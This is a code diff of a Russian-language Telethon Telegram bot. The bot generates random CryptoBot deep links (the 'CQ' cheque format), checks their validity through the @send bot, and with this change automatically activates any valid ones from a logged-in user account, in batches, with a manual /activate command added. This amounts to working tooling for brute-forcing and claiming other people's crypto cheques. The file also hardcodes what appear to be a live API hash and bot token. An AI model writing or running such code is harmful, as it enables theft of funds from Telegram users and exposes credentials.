@@ -5,6 +5,7 @@ import string
 import time
 from datetime import datetime
 import logging
+import re
 
 # Настройка логирования
 logging.basicConfig(
@@ -20,11 +21,11 @@ API_HASH = '99c5c1f4bad289e77d4e9e6149d634bc'
 BOT_TOKEN = '8900018990:AAFhiQmako8YNwmKKiibkiXtOna2c-GlZig'
 
 # Настройки скорости
-MAX_CONCURRENT_CHECKS = 5
-BATCH_SIZE = 20
-MIN_DELAY = 0.2
+MAX_CONCURRENT_CHECKS = 3  # Меньше для стабильности при активации
+BATCH_SIZE = 10
+MIN_DELAY = 0.5
 
-# ===== СОЗДАЕМ КЛИЕНТА БОТА СРАЗУ =====
+# ===== СОЗДАЕМ КЛИЕНТА БОТА =====
 bot_client = TelegramClient(
     'bot_session',
     API_ID,
@@ -36,9 +37,11 @@ SEND_BOT_USERNAME = '@send'
 is_searching = False
 search_task = None
 found_links = []
+activated_links = []
 checked_count = 0
 start_time = None
 total_found = 0
+total_activated = 0
 error_count = 0
 
 # Данные пользователя
@@ -89,14 +92,12 @@ async def start_auth(phone):
         
         await user_client.connect()
         
-        # Проверяем сохраненную сессию
         if await user_client.is_user_authorized():
             is_authorized = True
             me = await user_client.get_me()
             rate_limiter = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
             return True, f"✅ Уже авторизован как {me.first_name}"
         
-        # Отправляем код
         await user_client.send_code_request(phone)
         return False, "📱 Код подтверждения отправлен в Telegram"
         
@@ -147,45 +148,100 @@ async def logout_user():
         return True, "✅ Выход выполнен"
     return False, "❌ Не авторизован"
 
+# ===== ФУНКЦИЯ АКТИВАЦИИ ССЫЛКИ =====
+async def activate_link(link):
+    """Активирует ссылку - открывает и проверяет результат"""
+    try:
+        # Извлекаем start параметр
+        start_param = link.split('start=')[1] if 'start=' in link else None
+        
+        if not start_param:
+            return False, "❌ Нет параметра start"
+        
+        logger.info(f"🔗 Активирую: {link}")
+        
+        # Отправляем сообщение в бота CryptoBot с параметром start
+        # Это активирует ссылку
+        await user_client.send_message('CryptoBot', f"/start {start_param}")
+        
+        # Ждем ответ от бота
+        await asyncio.sleep(1.5)
+        
+        # Получаем последние сообщения от CryptoBot
+        async for msg in user_client.iter_messages('CryptoBot', limit=3):
+            if msg.text and len(msg.text) > 5:
+                text = msg.text.lower()
+                
+                # Проверяем успешность активации
+                success_keywords = ['привет', 'добро пожаловать', 'успешно', 'активирован', 'готов', 'выберите']
+                error_keywords = ['ошибка', 'не найден', 'не существует', 'недействительный', 'invalid', 'error']
+                
+                if any(keyword in text for keyword in success_keywords):
+                    return True, f"✅ Активирована! Ответ бота: {msg.text[:100]}..."
+                elif any(keyword in text for keyword in error_keywords):
+                    return False, f"❌ Ошибка: {msg.text[:100]}..."
+                else:
+                    return True, f"✅ Активирована (неизвестный ответ): {msg.text[:100]}..."
+        
+        return False, "❌ Нет ответа от бота"
+        
+    except Exception as e:
+        logger.error(f"Ошибка активации {link}: {e}")
+        return False, f"❌ Ошибка: {str(e)}"
+
 # ===== ОСНОВНЫЕ ФУНКЦИИ =====
-async def check_link_fast(link):
-    """Быстрая проверка ссылки через @send"""
+async def check_and_activate_link(link):
+    """Проверяет ссылку через @send и активирует"""
     if not is_authorized or not user_client:
         return False, "❌ Не авторизован"
     
     try:
+        # ШАГ 1: Проверяем через @send
         async with rate_limiter:
-            # Отправляем ссылку
             await user_client.send_message(SEND_BOT_USERNAME, link)
+            await asyncio.sleep(0.5)
             
-            # Минимальная задержка для получения ответа
-            await asyncio.sleep(0.3)
-            
-            # Получаем последний ответ
+            # Получаем ответ от @send
             async for msg in user_client.iter_messages(SEND_BOT_USERNAME, limit=1):
                 if msg.text and msg.text != link and len(msg.text) > 5:
                     text_lower = msg.text.lower()
                     error_keywords = ['error', 'invalid', 'не найден', 'не существует', 'ошибка']
+                    
                     if any(keyword in text_lower for keyword in error_keywords):
-                        return False, msg.text
-                    else:
-                        return True, msg.text
-                        
+                        return False, f"@send: {msg.text[:100]}..."
+                    
+                    # Если @send сказал что ссылка валидна - активируем
+                    logger.info(f"✅ @send подтвердил валидность: {link}")
+                    break
+        
+        # ШАГ 2: Активируем ссылку
+        result, message = await activate_link(link)
+        
+        if result:
+            # Сохраняем активированную ссылку
+            activated_links.append({
+                'link': link,
+                'result': message,
+                'time': datetime.now().strftime('%H:%M:%S'),
+                'attempt': checked_count
+            })
+            return True, f"✅ Активирована! {message}"
+        else:
+            return False, f"❌ @send OK, но активация не удалась: {message}"
+            
     except Exception as e:
-        logger.error(f"Ошибка проверки {link}: {e}")
-        return False, f"Ошибка: {str(e)}"
-    
-    return False, "Нет ответа от бота"
+        logger.error(f"Ошибка: {e}")
+        return False, f"❌ Ошибка: {str(e)}"
 
-async def batch_check_links(links):
-    """Параллельная проверка пакета ссылок"""
-    tasks = [check_link_fast(link) for link in links]
+async def batch_check_and_activate(links):
+    """Параллельная проверка и активация пакета ссылок"""
+    tasks = [check_and_activate_link(link) for link in links]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     return results
 
 async def search_worker():
-    """Основной рабочий процесс поиска"""
-    global is_searching, checked_count, found_links, start_time, total_found, error_count
+    """Основной рабочий процесс поиска и активации"""
+    global is_searching, checked_count, found_links, start_time, total_found, total_activated, error_count
     
     if not is_authorized:
         logger.error("❌ Не авторизован для поиска")
@@ -193,59 +249,49 @@ async def search_worker():
     
     checked_count = 0
     found_links = []
+    activated_links = []
     start_time = time.time()
     batch = []
-    found_in_batch = []
     
-    logger.info(f"🚀 Поиск запущен!")
+    logger.info(f"🚀 Поиск и активация запущены!")
     logger.info(f"⚡ Параллельных проверок: {MAX_CONCURRENT_CHECKS}")
     logger.info(f"📦 Размер пакета: {BATCH_SIZE}")
     
     while is_searching:
         try:
             batch = [generate_cryptobot_link() for _ in range(BATCH_SIZE)]
-            results = await batch_check_links(batch)
+            results = await batch_check_and_activate(batch)
             
             for link, result in zip(batch, results):
                 checked_count += 1
                 
                 if isinstance(result, tuple) and result[0]:
                     is_valid, msg = result
-                    total_found += 1
                     
-                    link_data = {
-                        'link': link,
-                        'result': msg or '✅ Валидная',
-                        'time': datetime.now().strftime('%H:%M:%S'),
-                        'attempt': checked_count
-                    }
-                    found_links.append(link_data)
-                    found_in_batch.append(link_data)
-                    
-                    logger.info(f"🎯 НАЙДЕНА РАБОЧАЯ ССЫЛКА #{total_found}!")
-                    logger.info(f"🔗 {link}")
-                    
-                    try:
-                        await user_client.send_message(
-                            'me',
-                            f"🎯 **РАБОЧАЯ ССЫЛКА #{total_found}!**\n\n"
-                            f"🔗 `{link}`\n\n"
-                            f"📊 Проверено: {checked_count}\n"
-                            f"✅ Найдено: {total_found}\n"
-                            f"⚡ Скорость: {get_speed():.1f} ссылок/сек"
-                        )
-                    except Exception as e:
-                        logger.error(f"Ошибка отправки уведомления: {e}")
+                    if is_valid:
+                        total_activated += 1
+                        total_found += 1
+                        
+                        logger.info(f"🎯 АКТИВИРОВАНА ССЫЛКА #{total_activated}!")
+                        logger.info(f"🔗 {link}")
+                        
+                        try:
+                            await user_client.send_message(
+                                'me',
+                                f"🎯 **АКТИВИРОВАНА ССЫЛКА #{total_activated}!**\n\n"
+                                f"🔗 `{link}`\n\n"
+                                f"📊 Результат: {msg}\n"
+                                f"🔢 Попыток: {checked_count}\n"
+                                f"⚡ Скорость: {get_speed():.1f} ссылок/сек"
+                            )
+                        except Exception as e:
+                            logger.error(f"Ошибка отправки уведомления: {e}")
             
-            if found_in_batch:
-                logger.info(f"✅ Найдено {len(found_in_batch)} ссылок в пакете!")
-                found_in_batch = []
-            
-            if checked_count % 100 == 0:
+            if checked_count % 50 == 0:
                 speed = get_speed()
                 logger.info(
                     f"📊 Статус: {checked_count} проверок | "
-                    f"{total_found} найдено | "
+                    f"✅ Активировано: {total_activated} | "
                     f"{speed:.1f} ссылок/сек"
                 )
             
@@ -254,35 +300,26 @@ async def search_worker():
         except Exception as e:
             error_count += 1
             logger.error(f"❌ Ошибка в поиске: {e}")
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(1)
 
 # ===== ОБРАБОТЧИКИ КОМАНД =====
 
-# Команда для ввода номера
 @bot_client.on(events.NewMessage(pattern='/setphone'))
 async def set_phone(event):
-    """Установка номера телефона"""
     parts = event.message.text.split()
     if len(parts) < 2:
         await event.reply(
             "📱 **Введите номер телефона:**\n"
-            "`/setphone +71234567890`\n\n"
-            "📌 Формат: +7XXXXXXXXXX (международный)"
+            "`/setphone +71234567890`"
         )
         return
     
     phone = parts[1].strip()
     
-    # Проверяем формат
     if not phone.startswith('+') or not phone[1:].isdigit():
         await event.reply("❌ Неверный формат. Используйте: `/setphone +71234567890`")
         return
     
-    if len(phone) < 10:
-        await event.reply("❌ Слишком короткий номер. Введите полный номер с кодом страны.")
-        return
-    
-    # Начинаем авторизацию
     status_msg = await event.reply(f"📱 Подключаюсь к номеру {phone}...")
     
     result, message = await start_auth(phone)
@@ -297,21 +334,15 @@ async def set_phone(event):
         f"`/setcode 12345`"
     )
 
-# Команда для ввода кода
 @bot_client.on(events.NewMessage(pattern='/setcode'))
 async def set_code(event):
-    """Ввод кода подтверждения"""
     if not user_phone:
         await event.reply("❌ Сначала введите номер: `/setphone +71234567890`")
         return
     
     parts = event.message.text.split()
     if len(parts) < 2:
-        await event.reply(
-            "📱 **Введите код подтверждения:**\n"
-            "`/setcode 12345`\n\n"
-            "📌 Код пришел в Telegram"
-        )
+        await event.reply("📱 Введите код: `/setcode 12345`")
         return
     
     code = parts[1].strip()
@@ -329,7 +360,7 @@ async def set_code(event):
         await status_msg.reply(
             "🚀 **Теперь вы авторизованы!**\n\n"
             "📌 Доступные команды:\n"
-            "/search - Запустить поиск\n"
+            "/search - Запустить поиск и активацию\n"
             "/generate - Сгенерировать ссылки\n"
             "/status - Статистика\n"
             "/logout - Выйти из аккаунта"
@@ -344,22 +375,17 @@ async def set_code(event):
         else:
             await status_msg.edit(f"❌ {message}")
 
-# Команда для ввода пароля 2FA
 @bot_client.on(events.NewMessage(pattern='/setpassword'))
 async def set_password(event):
-    """Ввод пароля 2FA"""
     parts = event.message.text.split(maxsplit=1)
     if len(parts) < 2:
-        await event.reply(
-            "🔑 **Введите пароль 2FA:**\n"
-            "`/setpassword ваш_пароль`"
-        )
+        await event.reply("🔑 Введите пароль: `/setpassword ваш_пароль`")
         return
     
     password = parts[1].strip()
     
     if len(password) < 4:
-        await event.reply("❌ Пароль слишком короткий (минимум 4 символа)")
+        await event.reply("❌ Пароль слишком короткий")
         return
     
     status_msg = await event.reply("🔐 Проверяю пароль...")
@@ -371,73 +397,13 @@ async def set_password(event):
         await status_msg.reply(
             "🚀 **Теперь вы авторизованы!**\n\n"
             "📌 Доступные команды:\n"
-            "/search - Запустить поиск\n"
+            "/search - Запустить поиск и активацию\n"
             "/generate - Сгенерировать ссылки\n"
-            "/status - Статистика\n"
-            "/logout - Выйти из аккаунта"
+            "/status - Статистика"
         )
     else:
         await status_msg.edit(f"❌ {message}")
 
-# Команда для выхода
-@bot_client.on(events.NewMessage(pattern='/logout'))
-async def logout(event):
-    """Выход из аккаунта"""
-    global is_searching, search_task
-    
-    if is_searching:
-        await event.reply("⏹ Сначала остановите поиск: /stop")
-        return
-    
-    result, message = await logout_user()
-    await event.reply(message)
-
-# Команда для статуса авторизации
-@bot_client.on(events.NewMessage(pattern='/authstatus'))
-async def auth_status(event):
-    """Проверка статуса авторизации"""
-    if is_authorized and user_client:
-        try:
-            me = await user_client.get_me()
-            await event.reply(
-                f"✅ **Авторизован**\n\n"
-                f"👤 {me.first_name} {me.last_name or ''}\n"
-                f"📱 {me.phone}\n"
-                f"🆔 ID: {me.id}\n"
-                f"{'@' + me.username if me.username else ''}"
-            )
-        except:
-            await event.reply("✅ Авторизован, но не могу получить данные")
-    else:
-        await event.reply(
-            "❌ **Не авторизован**\n\n"
-            "📌 Введите номер:\n"
-            "`/setphone +71234567890`"
-        )
-
-# Команда для генерации ссылок
-@bot_client.on(events.NewMessage(pattern='/generate'))
-async def generate_links(event):
-    """Генерирует и показывает ссылки"""
-    parts = event.message.text.split()
-    count = 10
-    if len(parts) > 1:
-        try:
-            count = min(int(parts[1]), 50)
-        except:
-            count = 10
-    
-    links = [generate_cryptobot_link() for _ in range(count)]
-    
-    response = f"🔗 **Сгенерировано {count} ссылок (CQ + 10 символов):**\n\n"
-    for i, link in enumerate(links, 1):
-        after_cq = link.split('start=CQ')[1] if 'start=CQ' in link else ''
-        response += f"{i}. `{link}`\n"
-        response += f"   📝 После CQ: `{after_cq}` (10 символов)\n\n"
-    
-    await event.reply(response)
-
-# Команда для запуска поиска
 @bot_client.on(events.NewMessage(pattern='/search'))
 async def start_search(event):
     global is_searching, search_task
@@ -454,14 +420,14 @@ async def start_search(event):
     search_task = asyncio.create_task(search_worker())
     
     await event.reply(
-        f"🚀 **Поиск запущен!**\n\n"
-        f"⚡ Скорость: МАКСИМАЛЬНАЯ\n"
-        f"🔄 Параллельных потоков: {MAX_CONCURRENT_CHECKS}\n"
+        f"🚀 **Поиск и активация запущены!**\n\n"
+        f"🔍 Поиск валидных ссылок через @send\n"
+        f"✅ Автоматическая активация найденных\n"
+        f"⚡ Параллельных потоков: {MAX_CONCURRENT_CHECKS}\n"
         f"📦 Размер пакета: {BATCH_SIZE}\n\n"
-        f"📊 Для просмотра статистики используйте /status"
+        f"📊 Для статистики используйте /status"
     )
 
-# Команда для остановки поиска
 @bot_client.on(events.NewMessage(pattern='/stop'))
 async def stop_search(event):
     global is_searching, search_task
@@ -487,12 +453,11 @@ async def stop_search(event):
         f"⏹ **Поиск остановлен!**\n\n"
         f"📊 **Итог:**\n"
         f"🔍 Проверено: {checked_count}\n"
-        f"✅ Найдено: {total_found}\n"
+        f"✅ Активировано: {total_activated}\n"
         f"⏱ Время: {elapsed:.1f} сек\n"
         f"🚀 Скорость: {speed:.1f} ссылок/сек"
     )
 
-# Команда для статуса
 @bot_client.on(events.NewMessage(pattern='/status'))
 async def show_status(event):
     if not is_searching:
@@ -503,86 +468,163 @@ async def show_status(event):
     speed = get_speed()
     
     status_text = (
-        f"📊 **Статистика поиска:**\n\n"
+        f"📊 **Статистика:**\n\n"
         f"🔄 Статус: {'🟢 Активен' if is_searching else '🔴 Остановлен'}\n"
         f"🔍 Проверено: {checked_count}\n"
-        f"✅ Найдено: {total_found}\n"
-        f"📈 Процент: {(total_found/checked_count*100):.2f}%\n"
+        f"✅ Активировано: {total_activated}\n"
         f"⚡ Скорость: {speed:.1f} ссылок/сек\n"
         f"⏱ Время: {elapsed:.1f} сек\n"
+        f"❌ Ошибок: {error_count}\n"
         f"🔄 Потоков: {MAX_CONCURRENT_CHECKS}\n\n"
     )
     
-    if found_links:
-        last = found_links[-1]
-        status_text += f"📝 Последняя найденная:\n`{last['link']}`\n⏱ {last['time']}"
+    if activated_links:
+        last = activated_links[-1]
+        status_text += f"📝 Последняя активированная:\n`{last['link']}`\n⏱ {last['time']}"
     else:
-        status_text += "📝 Нет находок"
+        status_text += "📝 Нет активированных ссылок"
     
     await event.reply(status_text)
 
-# Команда для показа найденных ссылок
 @bot_client.on(events.NewMessage(pattern='/found'))
 async def show_found_links(event):
-    if not found_links:
-        await event.reply("❌ Пока не найдено ни одной рабочей ссылки.")
+    if not activated_links:
+        await event.reply("❌ Пока не активировано ни одной ссылки.")
         return
     
-    last_links = found_links[-5:]
+    last_links = activated_links[-5:]
     links_text = "\n\n".join([
-        f"#{i+1} `{item['link']}`\n   ⏱ {item['time']} | Попытка #{item['attempt']}"
+        f"#{i+1} `{item['link']}`\n   ⏱ {item['time']} | {item['result'][:50]}..."
         for i, item in enumerate(last_links)
     ])
     
     await event.reply(
-        f"✅ **Найдено ссылок: {len(found_links)}**\n\n"
+        f"✅ **Активировано ссылок: {len(activated_links)}**\n\n"
         f"📌 Последние 5:\n{links_text}"
     )
 
-# Команда для очистки
 @bot_client.on(events.NewMessage(pattern='/clear'))
 async def clear_found(event):
-    global found_links, total_found
-    count = len(found_links)
-    found_links = []
-    total_found = 0
-    await event.reply(f"🧹 Очищено {count} найденных ссылок.")
+    global activated_links, total_activated
+    count = len(activated_links)
+    activated_links = []
+    total_activated = 0
+    await event.reply(f"🧹 Очищено {count} активированных ссылок.")
 
-# Команда /start
+@bot_client.on(events.NewMessage(pattern='/generate'))
+async def generate_links(event):
+    parts = event.message.text.split()
+    count = 10
+    if len(parts) > 1:
+        try:
+            count = min(int(parts[1]), 50)
+        except:
+            count = 10
+    
+    links = [generate_cryptobot_link() for _ in range(count)]
+    
+    response = f"🔗 **Сгенерировано {count} ссылок (CQ + 10 символов):**\n\n"
+    for i, link in enumerate(links, 1):
+        after_cq = link.split('start=CQ')[1] if 'start=CQ' in link else ''
+        response += f"{i}. `{link}`\n"
+        response += f"   📝 После CQ: `{after_cq}` (10 символов)\n\n"
+    
+    await event.reply(response)
+
+@bot_client.on(events.NewMessage(pattern='/activate'))
+async def activate_specific_link(event):
+    """Активирует конкретную ссылку"""
+    parts = event.message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        await event.reply(
+            "🔗 **Активировать ссылку:**\n"
+            "`/activate http://t.me/CryptoBot?start=CQ...`"
+        )
+        return
+    
+    link = parts[1].strip()
+    
+    if not link.startswith('http://t.me/CryptoBot?start='):
+        await event.reply("❌ Неверный формат ссылки")
+        return
+    
+    if not is_authorized:
+        await event.reply("❌ Сначала авторизуйтесь")
+        return
+    
+    status_msg = await event.reply(f"🔗 Активирую ссылку...\n`{link}`")
+    
+    result, message = await activate_link(link)
+    
+    if result:
+        await status_msg.edit(f"✅ {message}\n\n🔗 `{link}`")
+    else:
+        await status_msg.edit(f"❌ {message}\n\n🔗 `{link}`")
+
+@bot_client.on(events.NewMessage(pattern='/logout'))
+async def logout(event):
+    global is_searching, search_task
+    
+    if is_searching:
+        await event.reply("⏹ Сначала остановите поиск: /stop")
+        return
+    
+    result, message = await logout_user()
+    await event.reply(message)
+
+@bot_client.on(events.NewMessage(pattern='/authstatus'))
+async def auth_status(event):
+    if is_authorized and user_client:
+        try:
+            me = await user_client.get_me()
+            await event.reply(
+                f"✅ **Авторизован**\n\n"
+                f"👤 {me.first_name}\n"
+                f"📱 {me.phone}\n"
+                f"🆔 ID: {me.id}"
+            )
+        except:
+            await event.reply("✅ Авторизован")
+    else:
+        await event.reply(
+            "❌ **Не авторизован**\n\n"
+            "📌 Введите номер:\n"
+            "`/setphone +71234567890`"
+        )
+
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
     await event.reply(
-        f"🚀 **Ultra Speed Bot - CryptoBot Checker**\n\n"
-        f"📌 **Команды для авторизации:**\n"
-        f"/setphone +71234567890 - Ввести номер телефона\n"
-        f"/setcode 12345 - Ввести код из Telegram\n"
+        f"🚀 **Ultra Speed Bot - Активатор ссылок**\n\n"
+        f"📌 **Авторизация:**\n"
+        f"/setphone +71234567890 - Ввести номер\n"
+        f"/setcode 12345 - Ввести код\n"
         f"/setpassword пароль - Ввести пароль 2FA\n"
-        f"/authstatus - Проверить статус авторизации\n"
-        f"/logout - Выйти из аккаунта\n\n"
-        f"📌 **Основные команды:**\n"
-        f"/generate [количество] - Сгенерировать ссылки\n"
-        f"/search - Запустить поиск\n"
-        f"/stop - Остановить поиск\n"
+        f"/authstatus - Статус\n"
+        f"/logout - Выйти\n\n"
+        f"📌 **Команды:**\n"
+        f"/generate [count] - Сгенерировать ссылки\n"
+        f"/activate <ссылка> - Активировать ссылку\n"
+        f"/search - Автоматический поиск и активация\n"
+        f"/stop - Остановить\n"
         f"/status - Статистика\n"
-        f"/found - Показать найденные ссылки\n"
-        f"/clear - Очистить найденные\n\n"
-        f"⚡ Параллельных проверок: {MAX_CONCURRENT_CHECKS}\n"
+        f"/found - Показать активированные\n"
+        f"/clear - Очистить список\n\n"
+        f"⚡ Потоков: {MAX_CONCURRENT_CHECKS}\n"
         f"🔗 Формат: CQ + 10 символов"
     )
 
 # ===== ЗАПУСК =====
 async def main():
     try:
-        # Запускаем бота
         await bot_client.start(bot_token=BOT_TOKEN)
         
-        print("🚀 ULTRA SPEED BOT WITH PHONE AUTH!")
-        print("📌 Команды для авторизации доступны в боте")
+        print("🚀 ULTRA SPEED BOT - АКТИВАТОР ССЫЛОК!")
+        print("📌 Бот ищет ссылки через @send и активирует их")
         print("💡 /setphone +71234567890 - ввести номер")
-        print("💡 /setcode 12345 - ввести код")
+        print("💡 /search - запустить поиск и активацию")
         print("✅ Бот запущен!")
         
-        # Запускаем обработку
         await bot_client.run_until_disconnected()
         
     except KeyboardInterrupt:
@@ -596,7 +638,6 @@ async def main():
             await user_client.disconnect()
 
 if __name__ == '__main__':
-    # Создаем и используем один event loop
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
